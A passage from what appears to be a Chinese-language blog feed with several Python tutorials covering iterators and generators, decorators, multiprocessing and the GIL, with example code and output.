class="hljs">i am baseclass</code></pre><h2 id="八、Python-的迭代器和生成器"><a href="#八、Python-的迭代器和生成器" class="headerlink" title="八、Python 的迭代器和生成器"></a><strong>八、Python 的迭代器和生成器</strong></h2><h3 id="1-Python-中的迭代协议："><a href="#1-Python-中的迭代协议：" class="headerlink" title="1.Python 中的迭代协议："></a><strong>1.Python 中的迭代协议：</strong></h3><p><strong>什么是迭代器？</strong></p><p>迭代器是访问集合类元素的一种方式，我们能实现for循环其实背后就是迭代器,迭代器在Python 中叫做 Iterator ,背后实现的是 <code>__next__</code> 和 <code>__iter__</code> 方法</p><p><strong>示例代码：</strong></p><pre><code class="hljs">from collections import Iterable,Iteratora = [1,2,3,4,5]print isinstance(a,Iterable)print isinstance(a,Iterator)</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">TrueFalse</code></pre><p><strong>解释：</strong></p><p>可以看到 a 是一个列表，他是可迭代的，但是他并不是一个迭代器</p><h3 id="2-Python-中迭代器和可迭代对象的区别："><a href="#2-Python-中迭代器和可迭代对象的区别：" class="headerlink" title="2.Python 中迭代器和可迭代对象的区别："></a><strong>2.Python 中迭代器和可迭代对象的区别：</strong></h3><h4 id="1-回顾一下之前的代码："><a href="#1-回顾一下之前的代码：" class="headerlink" title="1.回顾一下之前的代码："></a><strong>1.回顾一下之前的代码：</strong></h4><pre><code class="hljs">class Company(object):    def __init__(self,employ_list):        self.employ = employ_list    def __getitem__(self, item):        return self.employ[item]if __name__ == &#39;__main__&#39;:    company = Company([&quot;tom&quot;,&quot;bob&quot;,&quot;angel&quot;])    for item in company:        print item</code></pre><p><strong>为什么这个能执行循环呢？</strong></p><p>实际上，我们在调用循环的时候会自动调用，iter() 这个方法，这个方法回去寻找实例化这个对象的类中有没有<code>__iter__</code> 这个方法,如果没有他会再退一步寻找<code>__getitem__</code> 这个魔法方法，然后完成调用.</p><h4 id="2-我们来自己实现一个迭代器："><a href="#2-我们来自己实现一个迭代器：" class="headerlink" title="2.我们来自己实现一个迭代器："></a><strong>2.我们来自己实现一个迭代器：</strong></h4><p><strong>示例代码：</strong></p><pre><code class="hljs"># coding=utf-8from collections import Iteratorclass MyIterator(Iterator):    def __init__(self, employ_list):        self.iter = employ_list        self.index = 0    def next(self):  # 真正返回迭代之的逻辑        try:            word = self.iter[self.index]        except IndexError:            raise StopIteration        self.index += 1        return wordclass Company(object):    def __init__(self, employ_list):        self.employ = employ_list    def __getitem__(self, item):        return self.employ[item]    def __iter__(self):        return MyIterator(self.employ)if __name__ == &#39;__main__&#39;:    company = Company([&quot;tom&quot;, &quot;bob&quot;, &quot;angel&quot;])    for i in company:        print i    </code></pre><p><strong>结果：</strong></p><pre><code class="hljs">tombobangel</code></pre><h3 id="3-Python-中的生成器函数："><a href="#3-Python-中的生成器函数：" class="headerlink" title="3.Python 中的生成器函数："></a><strong>3.Python 中的生成器函数：</strong></h3><h4 id="1-概念："><a href="#1-概念：" class="headerlink" title="1.概念："></a><strong>1.概念：</strong></h4><blockquote><p><strong>什么是生成器函数？</strong></p><p>只要函数中有 yield 关键字，这个函数就是生成器函数</p></blockquote><p><strong>示例代码：</strong></p><pre><code class="hljs">def gen_test():    yield 1def test():    return 2if __name__ == &#39;__main__&#39;:    gen = gen_test()    res = test()    print gen    print res</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">&lt;generator object gen_test at 0x00000000032457E0&gt;2</code></pre><p><strong>解释：</strong></p><p>我们看到，看似同样是定义一个函数，但是第一个实际上是一个生成器，生成器返回的是一个生成器对象，第二个返回的只是一个干巴巴的数据。</p><p><strong>那么我们怎么利用这个生成器的返回值呢？</strong></p><p>实际上他底层实现也是一个生成器，既然是生成器我们就能通过循环的方式调用</p><p><strong>示例代码：</strong></p><pre><code class="hljs">def gen_test():    yield 1def test():    return 2if __name__ == &#39;__main__&#39;:    gen = gen_test()    res = test()    for i in gen:        print i    </code></pre><p><strong>结果：</strong></p><pre><code class="hljs">1</code></pre><h4 id="2-看一下生成器的优势："><a href="#2-看一下生成器的优势：" class="headerlink" title="2.看一下生成器的优势："></a><strong>2.看一下生成器的优势：</strong></h4><p>原始的生成 斐波那契数列的方法：</p><p><strong>示例代码：</strong></p><pre><code class="hljs">def fib(index):    fib_list = []    n,a,b = 0,0,1    while n &lt; index:        fib_list.append(b)        a,b = b,a+b        n += 1    return fib_listfib_list = fib(10)print fib_list</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">[1, 1, 2, 3, 5, 8, 13, 21, 34, 55]</code></pre><p>但是这种方法在数字非常大的时候就非常的占用内存空间，他会先把结果放在数组中再返回给我们，于是我们尝试使用生成器</p><p><strong>示例代码：</strong></p><pre><code class="hljs">def fib(index):    n,a,b = 0,0,1    while n &lt; index:        yield b        a,b = b,a+b        n += 1if __name__ == &#39;__main__&#39;:    fib_list = []    for i in fib(10):        fib_list.append(i)    print fib_list</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">[1, 1, 2, 3, 5, 8, 13, 21, 34, 55]</code></pre><p>生成器方式就能实现在循环中不断生成，避免了一下子生成，（当然我这个代码为了方便大家看最后还是放在了列表中）</p><h3 id="4-Python-是怎么实现生成器的："><a href="#4-Python-是怎么实现生成器的：" class="headerlink" title="4.Python 是怎么实现生成器的："></a><strong>4.Python 是怎么实现生成器的：</strong></h3><h4 id="1-先来讲讲Python-是怎么实现函数调用的"><a href="#1-先来讲讲Python-是怎么实现函数调用的" class="headerlink" title="1.先来讲讲Python 是怎么实现函数调用的"></a><strong>1.先来讲讲Python 是怎么实现函数调用的</strong></h4><p><strong>实例函数：</strong></p><pre><code class="hljs">def foo():    passdef bar():    pass</code></pre><p>首先 python 有一个C语言写的Python的解释器，Python 的所有的代码都是运行在这个解释器之上的，然后我们开始调用foo 函数，一调用函数解释器就会在堆上分配一个栈帧，然后我们在这个栈帧上执行这个函数，然后发现他调用了一个子函数，又会在堆上分配一个新的栈帧，所有的栈帧都分配在堆上，这也就是说，栈帧能脱离于调用者存在</p><p>而生成器实际上就是对我们的栈帧进行的一次封装。保存了当前运行的状态，也就是说，我们能够使用其实现迭代</p><h4 id="接下来介绍函数装饰器的使用"><a href="#接下来介绍函数装饰器的使用" class="headerlink" title="接下来介绍函数装饰器的使用"></a>接下来介绍函数装饰器的使用</h4><p>这一部分我打算单独拿出来做一篇文章，请关注我的文章列表的 <strong>Python实用编程技巧(装饰器篇)</strong></p>]]></content>
    
    
    <categories>
      
      <category>编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>编程 Python 进阶 备忘</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python 实用编程技巧（装饰器篇）</title>
    <link href="/2018/10/04/Python%20%E5%AE%9E%E7%94%A8%E7%BC%96%E7%A8%8B%E6%8A%80%E5%B7%A7%EF%BC%88%E8%A3%85%E9%A5%B0%E5%99%A8%E7%AF%87%EF%BC%89/"/>
    <url>/2018/10/04/Python%20%E5%AE%9E%E7%94%A8%E7%BC%96%E7%A8%8B%E6%8A%80%E5%B7%A7%EF%BC%88%E8%A3%85%E9%A5%B0%E5%99%A8%E7%AF%87%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h2 id="一、如何使用函数装饰器？"><a href="#一、如何使用函数装饰器？" class="headerlink" title="一、如何使用函数装饰器？"></a><strong>一、如何使用函数装饰器？</strong></h2><h3 id="1-需求："><a href="#1-需求：" class="headerlink" title="1.需求："></a><strong>1.需求：</strong></h3><p>比如说，我们想为很多不同的函数添加相同的功能，比如说计时统计、记录日志、缓存运算结果等，但是我们又不想在每个函数中添加相同的代码</p><span id="more"></span><h3 id="2-举个例子："><a href="#2-举个例子：" class="headerlink" title="2.举个例子："></a><strong>2.举个例子：</strong></h3><p>我们还是以斐波那契数的计算为例</p><p><strong>示例代码：</strong></p><pre><code class="hljs">def fib(n):    if n &lt;= 1:        return 1    return fib(n-1)+fib(n-2)if __name__ == &#39;__main__&#39;:    print fib(50)</code></pre><p>这一段代码想要跑出来非常的慢，因为我们在这个运算的过程中经历了非常多的重复运算，比如我们想计算50就要计算49,48 我们要计算49 就要计算 48，47 ,看到了吧，48 就出现了重复运算，那么这里面有着太多太多的重复运算，导致我们的计算非常的慢，并且非常的消耗 CPU</p><p><strong>那么怎么办呢？</strong></p><p>我们可以创造一个缓存，每次算到一个新的结果我们都放在这个缓存中，这样我们每次都判断缓存有没有我们想要的值就可以了，有的话直接拿过来用，没有再加入缓存，这样就能大大提高我们的运行效率，并且减轻了我们的CPU 的负担</p><p><strong>示例代码：</strong></p><pre><code class="hljs">def fib(n,cache = None):    if cache is None:        cache = &#123;&#125;    if n in cache:        return cache[n]    if n &lt;= 1:        return 1    cache[n] = fib(n-1,cache)+fib(n-2,cache)    return cache[n]if __name__ == &#39;__main__&#39;:    print fib(50)</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">20365011074</code></pre><p>我们发现效率出现了质的飞跃，很快就算出了结果，但是换做别的函数我么又要添加这个缓存的代码了，这样就非常的烦，</p><p><strong>那么怎么解决呢？</strong></p><p>我们考虑创建一个包裹函数 wrap ，在这个函数内部我们实现我们的缓存代码，并且调用原函数，我们的函数装饰器就是为了生成这样的包裹函数的</p><p><strong>示例代码：</strong></p><pre><code class="hljs">def memo(func):    cache = &#123;&#125;    def wrap(*args):        if args not in cache:            cache[args] = func(*args)        return cache[args]    return wrapdef fib(n):    if n &lt;= 1:        return 1    return fib(n - 1) + fib(n - 2)if __name__ == &#39;__main__&#39;:    fib = memo(fib)    print fib(50)</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">20365011074</code></pre><p>当然这样在函数中写是非常啰嗦的，我们python 给我们提供了一个语法糖，</p><p><strong>示例代码：</strong></p><pre><code class="hljs">def memo(func):    cache = &#123;&#125;    def wrap(*args):        if args not in cache:            cache[args] = func(*args)        return cache[args]    return wrap@memodef fib(n):    if n &lt;= 1:        return 1    return fib(n - 1) + fib(n - 2)if __name__ == &#39;__main__&#39;:    print fib(50)</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">20365011074</code></pre><h2 id="二、如何为被装饰的函数保存元数据"><a href="#二、如何为被装饰的函数保存元数据" class="headerlink" title="二、如何为被装饰的函数保存元数据"></a><strong>二、如何为被装饰的函数保存元数据</strong></h2><h3 id="1-概念："><a href="#1-概念：" class="headerlink" title="1.概念："></a><strong>1.概念：</strong></h3><p>在函数对象中保存着一些函数的元数据,例如：</p><p><code>f.__name__</code>   函数的名字<br><code>f.__doc__ </code>   函数的文档字符串<br><code>f.__model__</code>  函数所属的模块名<br><code>f.__dict__</code>   属性字典<br><code>f.__defaults__</code>  默认参数元组</p><p>我们在使用装饰器以后，再使用上面这些属性访问的时候，看到的是包裹函数的元数据，而原始函数的元数据不见了，我们该如何解决</p><h3 id="2-举个例子：-1"><a href="#2-举个例子：-1" class="headerlink" title="2.举个例子："></a><strong>2.举个例子：</strong></h3><p>下面是原始函数的返回结果</p><p><strong>示例代码：</strong></p><pre><code class="hljs">def example():    &#39;&#39;&#39;example function&#39;&#39;&#39;    print &quot;In example&quot;if __name__ == &#39;__main__&#39;:    print example.__name__    print example.__doc__    </code></pre><p><strong>结果：</strong></p><pre><code class="hljs">exampleexample function</code></pre><p>这下面是经过装饰器装饰以后的返回结果</p><p><strong>示例代码：</strong></p><pre><code class="hljs">def mydecorator(func):    def wrap(*args,**kargs):        &#39;&#39;&#39;wrap function&#39;&#39;&#39;        print &quot;In wrapper&quot;        func(*args,**kargs)    return wrap@mydecoratordef example():    &#39;&#39;&#39;example function&#39;&#39;&#39;    print &quot;In example&quot;if __name__ == &#39;__main__&#39;:    print example.__name__    print example.__doc__</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">wrapwrap function</code></pre><p><strong>解决：</strong></p><p>我们使用 functools 中的 wraps 装饰内部的包裹函数，可以定义将原函数的某些属性更新到包裹函数上面</p><p><strong>示例代码:</strong></p><pre><code class="hljs">from functools import wrapsdef mydecorator(func):    @wraps(func)    def wrap(*args,**kargs):        &#39;&#39;&#39;wrap function&#39;&#39;&#39;        print &quot;In wrapper&quot;        func(*args,**kargs)    return wrap@mydecoratordef example():    &#39;&#39;&#39;example function&#39;&#39;&#39;    print &quot;In example&quot;if __name__ == &#39;__main__&#39;:    print example.__name__    print example.__doc__</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">exampleexample function</code></pre><h2 id="三、如何自定义带参数的装饰器"><a href="#三、如何自定义带参数的装饰器" class="headerlink" title="三、如何自定义带参数的装饰器"></a><strong>三、如何自定义带参数的装饰器</strong></h2><p>比如说我们想实现一个装饰器来检查被装饰函数的参数类型，装饰器能定义函数的参数类型，如果函数调用的时参数类型不对就抛出异常</p><p>带参数的装饰器就是根据参数定制化一个装饰器，可以看成是生产装饰器的工厂，每次调用这个装饰器都能返回一个特定的装饰器，然后再用其修饰其它函数</p><p><strong>示例代码：</strong></p><pre><code class="hljs">from inspect import signaturedef typeassert(*ty_args,**ty_kargs):    def decorator(func):        sig = signature(func)        btypes = sig.bind_partial(*ty_args,**ty_kargs).arguments        def wrapper(*args,**kargs):            for name,obj in sig.bind(*args,**kargs).arguments.items():                if name in btypes:                    if not isinstance(obj,btypes[name]):                        raise TypeError(&quot;%s must be %s&quot; % (name,btypes[name]))            return func(*args,**kargs)        return wrapper    return decorator@typeassert(int,str,list)def f(a,b,c):    print (a,b,c)if __name__ == &#39;__main__&#39;:    f(1,&quot;abc&quot;,[1,2,3])    f(1,2,[1,2,3])</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">1 abc [1, 2, 3]TypeError: b must be &lt;class &#39;str&#39;&gt;</code></pre><h2 id="四、如何实现属性可修改的装饰器"><a href="#四、如何实现属性可修改的装饰器" class="headerlink" title="四、如何实现属性可修改的装饰器"></a><strong>四、如何实现属性可修改的装饰器</strong></h2><h3 id="背景："><a href="#背景：" class="headerlink" title="背景："></a><strong>背景：</strong></h3><p>为了分析程序内哪些程序开销较大，我们可以定义一个带有timeout 参数的函数装饰器，他实现以下功能：</p><p>1.统计被装饰的函数的单次调用的时间<br>2.时间大于timeout 的将此次函数的调用记录记录在 log 日志文件中<br>3.运行时可以修改 timeout 的值</p><p><strong>示例代码：</strong></p><pre><code class="hljs">from functools import wrapsimport timeimport loggingfrom random import randintdef warn(timeout):     def decorator(func):        @wraps(func)        def wrapper(*args,**kargs):            start = time.time()            res = func(*args,**kargs)            used = time.time() - start            if used &gt; timeout:                msg = &quot;%s : %s &gt; %s&quot; % (func.__name__,used,timeout)                logging.warn(msg)            return res        return wrapper    return decorator@warn(1.5)def test():    print(&quot;In test&quot;)    while randint(0,1):        time.sleep(0.5)for i in range(30):    test()</code></pre><p>我们可以在包裹中添加一个函数，然后用这个函数来修改闭包中的自由变量</p><p><strong>Python3</strong> </p><p><strong>示例代码：</strong></p><pre><code class="hljs">from functools import wrapsimport timeimport loggingfrom random import randintdef warn(timeout):    def decorator(func):        @wraps(func)        def wrapper(*args,**kargs):            start = time.time()            res = func(*args,**kargs)            used = time.time() - start            if used &gt; timeout:                msg = &quot;%s : %s &gt; %s&quot; % (func.__name__,used,timeout)                logging.warn(msg)            return res        def setTimeout(k):            nonlocal timeout            timeout = k        wrapper.setTimeout = setTimeout                return wrapper    return decorator@warn(1)def test():    print(&quot;In test&quot;)    while randint(0,1):        time.sleep(0.5)for i in range(30):    test()test.setTimeout(1)for i in range(30):    test()</code></pre><p>但是由于 python2 并不支持 nonlocal ，于是我们还要修改，使用列表将其修改成一个可变变量</p><p><strong>示例代码：</strong></p><pre><code class="hljs">from functools import wrapsimport timeimport loggingfrom random import randintdef warn(timeout):    timeout = [timeout]    def decorator(func):        @wraps(func)        def wrapper(*args,**kargs):            start = time.time()            res = func(*args,**kargs)            used = time.time() - start            if used &gt; timeout[0]:                msg = &quot;%s : %s &gt; %s&quot; % (func.__name__,used,timeout[0])                logging.warn(msg)            return res        def setTimeout(k):            #nonlocal timeout            timeout[0] = k        wrapper.setTimeout = setTimeout        return wrapper    return decorator@warn(1)def test():    print(&quot;In test&quot;)    while randint(0,1):        time.sleep(0.5)for i in range(30):    test()test.setTimeout(1)for i in range(30):    test()</code></pre>]]></content>
    
    
    <categories>
      
      <category>编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>编程 Python 进阶 备忘</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python 实用编程技巧（多进程篇）</title>
    <link href="/2018/10/02/Python%20%E5%AE%9E%E7%94%A8%E7%BC%96%E7%A8%8B%E6%8A%80%E5%B7%A7%EF%BC%88%E5%A4%9A%E8%BF%9B%E7%A8%8B%E7%AF%87%EF%BC%89/"/>
    <url>/2018/10/02/Python%20%E5%AE%9E%E7%94%A8%E7%BC%96%E7%A8%8B%E6%8A%80%E5%B7%A7%EF%BC%88%E5%A4%9A%E8%BF%9B%E7%A8%8B%E7%AF%87%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h2 id="一、为什么选择多进程编程"><a href="#一、为什么选择多进程编程" class="headerlink" title="一、为什么选择多进程编程"></a><strong>一、为什么选择多进程编程</strong></h2><p>我们在多线程篇说过 Python 有一个 GIL 锁，这导致我们无法发挥多核CPU 的性能，于是对于一些耗CPU 的操作（比如：计算、图像处理），我们使用多线程编程显得就不那么好，于是我们采用多进程编程，这样就能充分利用CPU 并发来提高运行的效率（多I&#x2F;O操作的尽量使用多线程编程，这样不会影响性能）</p><span id="more"></span><blockquote><p>**注：**本文使用 Python3 实现，但是除了和 Python2 在 print 上的差别外其他都是一样的</p></blockquote><h2 id="二、多线程与多进程的直观比较"><a href="#二、多线程与多进程的直观比较" class="headerlink" title="二、多线程与多进程的直观比较"></a><strong>二、多线程与多进程的直观比较</strong></h2><h3 id="1-我们以计算斐波那契数列为例来比较两种方式的执行速度"><a href="#1-我们以计算斐波那契数列为例来比较两种方式的执行速度" class="headerlink" title="1.我们以计算斐波那契数列为例来比较两种方式的执行速度"></a><strong>1.我们以计算斐波那契数列为例来比较两种方式的执行速度</strong></h3><h4 id="1-多线程方式"><a href="#1-多线程方式" class="headerlink" title="1.多线程方式"></a><strong>1.多线程方式</strong></h4><p><strong>示例代码：</strong></p><pre><code class="hljs">import timefrom concurrent.futures import ThreadPoolExecutor,as_completeddef fib(n):    if n&lt;= 2:        return 1    return fib(n-1)+fib(n-2)with ThreadPoolExecutor(3) as executor:    tasks = [executor.submit(fib, (num)) for num in range(25,35)]    start_time = time.time()    for future in as_completed(tasks):        data = future.result()        print(&quot;exe result &#123;num&#125;&quot;.format(num = data))    print(&quot;last time is &#123;time&#125;&quot;.format(time = time.time()-start_time))</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">exe result 75025exe result 121393exe result 196418exe result 317811exe result 514229exe result 832040exe result 1346269exe result 2178309exe result 3524578exe result 5702887last time is 3.65224289894104</code></pre><h4 id="2-多进程方式："><a href="#2-多进程方式：" class="headerlink" title="2.多进程方式："></a><strong>2.多进程方式：</strong></h4><p><strong>示例代码：</strong></p><pre><code class="hljs">import timefrom concurrent.futures import ThreadPoolExecutor,as_completedfrom concurrent.futures import ProcessPoolExecutordef fib(n):    if n&lt;= 2:        return 1    return fib(n-1)+fib(n-2)if __name__ == &#39;__main__&#39;:    with ProcessPoolExecutor(3) as executor:        tasks = [executor.submit(fib, (num)) for num in range(25,35)]        start_time = time.time()        for future in as_completed(tasks):            data = future.result()            print(&quot;exe result &#123;num&#125;&quot;.format(num = data))        print(&quot;last time is &#123;time&#125;&quot;.format(time = time.time()-start_time))</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">exe result 75025exe result 121393exe result 196418exe result 317811exe result 514229exe result 832040exe result 1346269exe result 2178309exe result 3524578exe result 5702887last time is 2.270967960357666</code></pre><p><strong>结论：</strong></p><p>可以很清楚地看到使用多线程的方式计算来的更快</p><h3 id="2-我们以频繁I-O操作的任务为例来比较两种方式的执行速度"><a href="#2-我们以频繁I-O操作的任务为例来比较两种方式的执行速度" class="headerlink" title="2.我们以频繁I&#x2F;O操作的任务为例来比较两种方式的执行速度"></a><strong>2.我们以频繁I&#x2F;O操作的任务为例来比较两种方式的执行速度</strong></h3><h4 id="1-多线程方式-1"><a href="#1-多线程方式-1" class="headerlink" title="1.多线程方式"></a><strong>1.多线程方式</strong></h4><p><strong>示例代码：</strong></p><pre><code class="hljs">import timefrom concurrent.futures import ThreadPoolExecutor,as_completedfrom concurrent.futures import ProcessPoolExecutordef random_sleep(n):    time.sleep(n)    return nif __name__ == &#39;__main__&#39;:    with ThreadPoolExecutor(3) as executor:        tasks = [executor.submit(random_sleep, (num)) for num in [2]*30]        start_time = time.time()        for future in as_completed(tasks):            data = future.result()            print(&quot;exe result &#123;num&#125;&quot;.format(num = data))        print(&quot;last time is &#123;time&#125;&quot;.format(time = time.time()-start_time))</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">last time is 20.006227493286133</code></pre><h4 id="2-多进程方式：-1"><a href="#2-多进程方式：-1" class="headerlink" title="2.多进程方式："></a><strong>2.多进程方式：</strong></h4><p><strong>示例代码：</strong></p><pre><code class="hljs">import timefrom concurrent.futures import ThreadPoolExecutor,as_completedfrom concurrent.futures import ProcessPoolExecutordef random_sleep(n):    time.sleep(n)    return nif __name__ == &#39;__main__&#39;:    with ProcessPoolExecutor(3) as executor:        tasks = [executor.submit(random_sleep, (num)) for num in [2]*30]        start_time = time.time()        for future in as_completed(tasks):            data = future.result()            print(&quot;exe result &#123;num&#125;&quot;.format(num = data))        print(&quot;last time is &#123;time&#125;&quot;.format(time = time.time()-start_time))</code></pre><p><strong>结果:</strong></p><pre><code class="hljs">last time is 20.205044746398926</code></pre><p><strong>结论：</strong></p><p>对于I&#x2F;O 操作来讲，多线程方式要优于多进程方式</p><h2 id="三、multiprocessing-多进程编程"><a href="#三、multiprocessing-多进程编程" class="headerlink" title="三、multiprocessing 多进程编程"></a><strong>三、multiprocessing 多进程编程</strong></h2><p>进程的数据是完全隔离的，不能像线程一样通过全局变量进行通信。<br>多进程编程首选还是使用上面我们测试用的那个包，因为他和多线程编程的接口一致，设计精良，而这个multiprocessig 更加底层一些</p><p><strong>示例代码：</strong></p><pre><code class="hljs">import multiprocessingimport timedef get_html(n):    time.sleep(n)    print(&quot;sub progress success&quot;)    return nif __name__ == &#39;__main__&#39;:    progress = multiprocessing.Process(target=get_html,args=(2,))    progress.start()    print(progress.pid)    progress.join()    print(&quot;main progress end&quot;)</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">29244sub progress successmain progress end</code></pre><h2 id="四、使用进程池"><a href="#四、使用进程池" class="headerlink" title="四、使用进程池"></a><strong>四、使用进程池</strong></h2><p><strong>示例代码：</strong></p><pre><code class="hljs">import multiprocessingimport timedef get_html(n):    time.sleep(n)    print(&quot;sub process success&quot;)    return nif __name__ == &#39;__main__&#39;:    pool = multiprocessing.Pool(multiprocessing.cpu_count())# 创建线程池    result = pool.apply_async(get_html,args=(3,)) #添加进线程池    pool.close() #禁止其他进程再次加入    pool.join()    print(result.get())    </code></pre><p><strong>结果：</strong></p><pre><code class="hljs">sub process success3</code></pre><p>当然我们可能会想用迭代的进程池，没问题，Python 给我们提供了这样的方法 pool.imap()，</p><p><strong>示例代码</strong>：</p><pre><code class="hljs">import multiprocessingimport timedef get_html(n):    time.sleep(n)    print(&quot;sub process success&quot;)    return nif __name__ == &#39;__main__&#39;:    pool = multiprocessing.Pool(multiprocessing.cpu_count())# 创建线程池    for result in pool.imap(get_html,[1,3,5,7,9]):        print(&quot;sleep &#123;time&#125; success&quot;.format(time = result))    </code></pre><p><strong>结果：</strong></p><pre><code class="hljs">sub process successsleep 1 successsub process successsleep 3 successsub process successsleep 5 successsub process successsleep 7 successsub process successsleep 9 success</code></pre><h2 id="五、进程间通信"><a href="#五、进程间通信" class="headerlink" title="五、进程间通信"></a><strong>五、进程间通信</strong></h2><h3 id="方法一：使用进程队列"><a href="#方法一：使用进程队列" class="headerlink" title="方法一：使用进程队列"></a><strong>方法一：使用进程队列</strong></h3><p><strong>示例代码：</strong></p><pre><code class="hljs">from multiprocessing import Process,Queueimport timedef Producer(queue):    queue.put(&quot;a&quot;)    time.sleep(2)def Consumer(queue):    time.sleep(2)    res = queue.get()    print(res)if __name__ == &#39;__main__&#39;:    queue = Queue(10)    task1 = Process(target=Producer,args=(queue,))    task2 = Process(target=Consumer,args=(queue,))    task1.start()    task2.start()    task1.join()    task2.join()</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">a</code></pre><blockquote><p><strong>注意：</strong></p><p>1.共享全局变量进行通信的方法在多进程编程中是不能实现的，因为进程在 fork 的时候会将所有的变量赋值一分到自己的空间，进程之间是隔离的</p><p>2.Queue() 是不能用于进程池的进程之间的通信的</p></blockquote><h3 id="方法二：使用Manager-中的-Queue-实现进程池中的通信"><a href="#方法二：使用Manager-中的-Queue-实现进程池中的通信" class="headerlink" title="方法二：使用Manager 中的 Queue 实现进程池中的通信"></a><strong>方法二：使用Manager 中的 Queue 实现进程池中的通信</strong></h3><p><strong>示例代码：</strong></p><pre><code class="hljs">from multiprocessing import Process,Queue,Pool,Managerimport timedef Producer(queue):    queue.put(&quot;a&quot;)    time.sleep(2)def Consumer(queue):    time.sleep(2)    res = queue.get()    print(res)if __name__ == &#39;__main__&#39;:    queue = Manager().Queue(10)    pool = Pool(2)    pool.apply_async(Producer,args=(queue,))    pool.apply_async(Consumer,args=(queue,))    pool.close()    pool.join()</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">a</code></pre><h3 id="方法三：使用Pipe-实现两个进程之间的通信"><a href="#方法三：使用Pipe-实现两个进程之间的通信" class="headerlink" title="方法三：使用Pipe 实现两个进程之间的通信"></a><strong>方法三：使用Pipe 实现两个进程之间的通信</strong></h3><p>pipe 只能用于两个进程之间的通信，效率比queue 高</p><p><strong>示例代码：</strong></p><p>from multiprocessing import Process,Pipe</p><p>def Producer(pipe):<br>    pipe.send(“a”)</p><p>def Consumer(pipe):<br>    print(pipe.recv())</p><p>if <strong>name</strong> &#x3D;&#x3D; ‘<strong>main</strong>‘:<br>    receive_pipe,send_pipe &#x3D; Pipe()<br>    task1 &#x3D; Process(target&#x3D;Producer,args&#x3D;(send_pipe,))<br>    task2 &#x3D; Process(target&#x3D;Consumer,args&#x3D;(receive_pipe,))<br>    task1.start()<br>    task2.start()<br>    task1.join()<br>    task2.join()</p><p><strong>结果:</strong></p><pre><code class="hljs">a</code></pre><h2 id="六、进程间内存共享"><a href="#六、进程间内存共享" class="headerlink" title="六、进程间内存共享"></a><strong>六、进程间内存共享</strong></h2><p><strong>示例代码：</strong></p><pre><code class="hljs">from multiprocessing import Processimport multiprocessingdef add_data(p_dict,key,value):    p_dict[key] = valueif __name__ == &#39;__main__&#39;:    mgr = multiprocessing.Manager()    progress_dict = mgr.dict()    first_progress = Process(target=add_data,args=(progress_dict,&quot;Bob&quot;,22))    second_progress =  Process(target=add_data,args=(progress_dict,&quot;Alic&quot;,20))    first_progress.start()    second_progress.start()    first_progress.join()    second_progress.join()    print progress_dict</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">&#123;&#39;Bob&#39;: 22, &#39;Alic&#39;: 20&#125;</code></pre><p><strong>解释：</strong></p><p>可以看到，虽然是不同的进程，但是他们共同操纵了一个变量</p>]]></content>
    
    
    <categories>
      
      <category>编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>编程 Python 进阶 备忘</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python 实用编程技巧（多线程篇）</title>
    <link href="/2018/10/01/Python%20%E5%AE%9E%E7%94%A8%E7%BC%96%E7%A8%8B%E6%8A%80%E5%B7%A7%EF%BC%88%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%AF%87%EF%BC%89/"/>
    <url>/2018/10/01/Python%20%E5%AE%9E%E7%94%A8%E7%BC%96%E7%A8%8B%E6%8A%80%E5%B7%A7%EF%BC%88%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%AF%87%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h2 id="一、GIL-global-interpreter-lock"><a href="#一、GIL-global-interpreter-lock" class="headerlink" title="一、GIL(global_interpreter_lock)"></a><strong>一、GIL(global_interpreter_lock)</strong></h2><h3 id="1-概念："><a href="#1-概念：" class="headerlink" title="1.概念："></a><strong>1.概念：</strong></h3><p>Python 一开始为了简单，在多线程编程的时候会在我们的解释器上加一个非常大的锁，也就是允许我们一次只有一个线程运行在一个CPU上，gil 就能实现在同一时刻只有一个线程在CPU上执行字节码（目的当然是保证线程安全），当然他的性能也是非常让人诟病，因为他也无法将多个线程映射到多个CPU上（体现不出多核CPU的优势）</p><span id="more"></span><blockquote><p><strong>解释：</strong> python 在执行程序之前会将其先编译成字节码，我们可以使用 dis.dis() 这个函数对某个函数进行反编译</p></blockquote><p><strong>示例代码：</strong></p><pre><code class="hljs">import disdef a():    a = 1    a +=1    return aprint dis.dis(a)</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">  4           0 LOAD_CONST               1 (1)              3 STORE_FAST               0 (a)  5           6 LOAD_FAST                0 (a)              9 LOAD_CONST               1 (1)             12 INPLACE_ADD                      13 STORE_FAST               0 (a)  6          16 LOAD_FAST                0 (a)             19 RETURN_VALUE        None</code></pre><h3 id="2-GPL-真的那么安全吗："><a href="#2-GPL-真的那么安全吗：" class="headerlink" title="2.GPL 真的那么安全吗："></a><strong>2.GPL 真的那么安全吗：</strong></h3><p>实际上在程运行过程中GPL 是会在一定时候释放的，并不是一个执行完了才会执行另一个程序</p><p><strong>示例代码：</strong></p><pre><code class="hljs">import threadingtotal = 0def add():    global total    for i in xrange(100000):         total += 1def desc():    global total    for i in xrange(100000):        total -= 1thread1 = threading.Thread(target = add)thread2 = threading.Thread(target = 